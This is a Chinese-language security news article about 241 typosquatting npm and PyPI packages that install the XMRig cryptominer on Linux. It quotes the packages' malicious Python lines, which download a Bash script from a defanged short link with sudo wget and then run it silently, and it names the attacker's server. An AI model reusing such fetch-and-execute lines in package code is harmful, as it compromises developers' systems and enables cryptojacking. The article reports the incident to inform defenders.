241个npm 和PyPI 包被指释放Linux 挖矿机

本周，研究人员发现200多个恶意包感染PyPI 和npm开源注册表。这些程序包基本是使用广泛的库的typosquat且它们都会在Linux 系统上下载 Bash 脚本，运行挖矿包。




充斥着挖矿包的 PyPI 和npm

研究人员发现，至少有241个恶意npm和PyPI 包在感染Linux 设备后释放挖矿机。这些包是热门开源包和命令如 React、argparse和AIOHTTP的typosquat，但他们从威胁行动者的服务器上下载并安装挖矿Bash脚本。

上周三，软件开发人员兼研究员Hauke Lübbers发现，在PyPI 上“至少有33个项目”感染系统后启动了开源的门罗挖矿机 XMRig。在他将这33个恶意项目报告给 PyPI 管理员的过程中，他发现威胁行动者开始以同样的恶意payload发布另外22个程序包。Lübbers指出，“我报告给PyPI后，他们迅速删除了这些恶意包，但恶意人员仍在上传更多的程序包，上传了其它22个程序包。这些程序包针对的是Linux系统并安装密币挖矿软件XMRig。”

包括如下代码的Python 包通过 Bit.ly URL 短地址从威胁者的服务器上下载了该Bash 脚本：

os.system("sudo wget https://bit[.]ly/3c2tMTT -O ./.cmc -L >/dev/null 2>&1")

os.system("chmod +x .cmc >/dev/null 2>&1")

os.system("./.cmc >/dev/null 2>&1")

Lübbers 解释称，该Bit.ly URL 重定向至托管在80.78.25[.]140:8000，“这是通过下载并执行http://80.78.25[.]140:8000/.cmc 的Bash脚本完成的。”执行时，该脚本将受陷主机的IP地址以及挖矿机部署是否成功告知威胁行动者。

在撰写之时，该IP地址已不在，但该脚本的副本证实了研究人员的言论。Lübbers表示，“我是通过自己的一个小项目发现这些恶意包的。我把这个小项目称为 Package Observatory Clud，它会查询并存储所有上传到 PyPI 和 Rubyems.org 中的新的程序包的元数据并运行一些启发式。如果它认为程序包可疑，则会发出警报，我会进行查看。”他所知的启发式主要是说与标准库和流行包类似的程序包的名称，说明可能存在可疑的 typosquat。

他表示，“我经常会收到误报，但上周它似乎从PyPI 上发现很多typosquat。我做这件事的原因是，信息安全社区从开源软件生态系统中获益如此多，我认为我们应当回馈。或者找到并报告漏洞，或者阻止它落到恶意人员之手，或者直接做出贡献均可。我们需要记住，程序包仓库的很多工作是由区区几名志愿者完成的。”

此前，Sonatype 公司的研究员还发现，186个npm typosquat 程序包也是通过同样的URL下载恶意Bash脚本。这两个注册表迅速从平台删除了这些typoquat，以免开发人员受影响。

尽管有多种安全增强措施，如为关键项目强制实施双因素认证机制并引入新特性（如python 用setuptools取代setup.py），但开源仓库与威胁人员之间的竞争变得更加激烈。

上周，Chckmarx 发现数十个恶意Python包在Counter-Strike 服务器上执行DDoS 攻击。本月早些时候，网络安全公司 CheckPoint 提到10个恶意PyPI 包窃取开发人员的凭据。7月份，ReversingLabs 的研究员披露了名为IconBurst的供应链攻击，该攻击仍然是通过typosquat感染开发人员。
